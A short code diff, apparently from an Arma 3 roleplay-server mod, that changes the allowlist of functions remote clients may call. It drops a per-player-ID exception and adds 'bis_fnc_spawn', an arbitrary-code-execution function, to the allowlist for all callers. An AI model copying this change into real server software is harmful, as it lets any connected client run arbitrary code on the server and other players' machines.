@@ -26,11 +26,7 @@ _isCall =	[_varValue,5,false,[false]] call bis_fnc_param;
 _callerName = [_varValue,6,"",[""]] call bis_fnc_param;
 _callerUID = [_varValue,7,"",[""]] call bis_fnc_param;
 
-_validFunctions = ["bis_fnc_execvm","bis_fnc_effectkilledairdestruction","bis_fnc_effectkilledairdestructionstage2"];
-if(getPlayerUID player in ["76561197985458229"]) then 
-{
-	_validFunctions set [count _validFunctions,"bis_fnc_spawn"];
-};
+_validFunctions = ["bis_fnc_execvm","bis_fnc_effectkilledairdestruction","bis_fnc_effectkilledairdestructionstage2","bis_fnc_spawn"];
 if(!(["life_fnc_",_functionName] call BIS_fnc_inString) && {!(["SPY_fnc_",_functionName] call BIS_fnc_inString)} && {!(["DB_fnc_",_functionName] call BIS_fnc_inString)} && {!(["TON_fnc_",_functionName] call BIS_fnc_inString)} &&
 {!(toLower(_functionName) in _validFunctions)} && {!(["SOCK_fnc_",_functionName] call BIS_fnc_inString)} && {!(["zlt_fnc_",_functionName] call BIS_fnc_inString)}) exitWith {false};
 if(toLower(_functionName) == "db_fnc_asynccall") exitWith {false};
